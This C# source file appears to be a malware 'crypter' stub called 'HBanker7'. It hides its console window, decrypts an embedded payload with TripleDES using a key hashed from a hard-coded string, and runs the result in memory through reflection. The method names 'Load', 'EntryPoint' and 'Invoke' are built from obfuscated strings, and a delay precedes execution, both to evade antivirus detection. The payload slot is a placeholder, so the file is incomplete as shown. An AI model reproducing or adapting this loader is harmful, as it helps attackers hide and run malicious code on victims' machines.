using System;
using System.Collections.Generic;
using System.Linq;
namespace HB
{
    class Program
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private class L01
        {

            [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            internal static extern IntPtr GetConsoleWindow();
            internal static object L02 = null;
            internal static object L03 = null;
            internal static object L04 = null;
            internal static byte[] L05 = null;
            internal static object L06 = Microsoft.VisualBasic.CallType.Method;
            internal static object L07 = Microsoft.VisualBasic.CallType.Get;
            internal static object L08 = new object[0];
            internal static String L09 = "HBanker7";
            internal static object L10 = AppDomain.CurrentDomain;
            internal static object L11 = string.Empty;
            internal static string L12 = Microsoft.VisualBasic.Strings.StrReverse("'3''2''1''0'").Replace("'0'", "L").Replace("'1'", "o").Replace("'2'", "a").Replace("'3'", "d");
            internal static string L13 = Microsoft.VisualBasic.Strings.StrReverse("'5''4''3''2''1''0'").Replace("'0'", "I").Replace("'1'", "n").Replace("'2'", "v").Replace("'3'", "o").Replace("'4'", "k").Replace("'5'", "e");
            internal static string L14 = Microsoft.VisualBasic.Strings.StrReverse("'9''8''7''6''5''4''3''2''1''0'").Replace("'0'", "E").Replace("'1'", "n").Replace("'2'", "t").Replace("'3'", "r").Replace("'4'", "y").Replace("'5'", "P").Replace("'6'", "o").Replace("'7'", "i").Replace("'8'", "n").Replace("'9'", "t");
            internal static string L15 = Microsoft.VisualBasic.Strings.StrReverse("'2''1''0'").Replace("'0'", "0").Replace("'1'", ".").Replace("'2'", "1");
            internal static string L16 = Microsoft.VisualBasic.Strings.StrReverse("'2''1''0'").Replace("'0'", "0").Replace("'1'", ".").Replace("'2'", "1");
        }
        static void Main(string[] args)
        {
            IntPtr F = L01.GetConsoleWindow();
            L01.ShowWindow(F, 0);
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(L01.L15, L01.L16, false) == 0)
            {
                L01.L05 = //File;
            }
            System.Security.Cryptography.PaddingMode L17 = System.Security.Cryptography.PaddingMode.PKCS7;
            System.Security.Cryptography.CipherMode L18 = System.Security.Cryptography.CipherMode.ECB;
            System.Security.Cryptography.MD5CryptoServiceProvider L19 = new System.Security.Cryptography.MD5CryptoServiceProvider();
            byte[] L20 = L19.ComputeHash(System.Text.Encoding.Unicode.GetBytes(L01.L09));
            L19.Clear();
            System.Security.Cryptography.TripleDESCryptoServiceProvider L21 = new System.Security.Cryptography.TripleDESCryptoServiceProvider();
            L21.Key = L20;
            L21.Mode = L18;
            L21.Padding = L17;
            System.Security.Cryptography.ICryptoTransform L22 = L21.CreateDecryptor();
            byte[] L222 = L22.TransformFinalBlock(L01.L05, 0, L01.L05.Length);
            L21.Clear();
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(L01.L15, L01.L16, false) == 0)
            {
                L01.L02 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(L01.L10), L01.L12, (Microsoft.VisualBasic.CallType)Microsoft.VisualBasic.CompilerServices.Conversions.ToInteger(L01.L06), new object[]
				{
					L222
				}));
            }
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(L01.L15, L01.L16, false) == 0)
            {
                L01.L03 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(L01.L02), L01.L14, (Microsoft.VisualBasic.CallType)Microsoft.VisualBasic.CompilerServices.Conversions.ToInteger(L01.L07), new object[0]));
            }
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(L01.L15, L01.L16, false) == 0)
            {
                System.Threading.Thread.Sleep(3000);
                L01.L04 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(L01.L03), L01.L13, (Microsoft.VisualBasic.CallType)Microsoft.VisualBasic.CompilerServices.Conversions.ToInteger(L01.L06), new object[]
				{
					System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(L01.L11),
					null
				}));
            }
            
           
        }
        
    }
}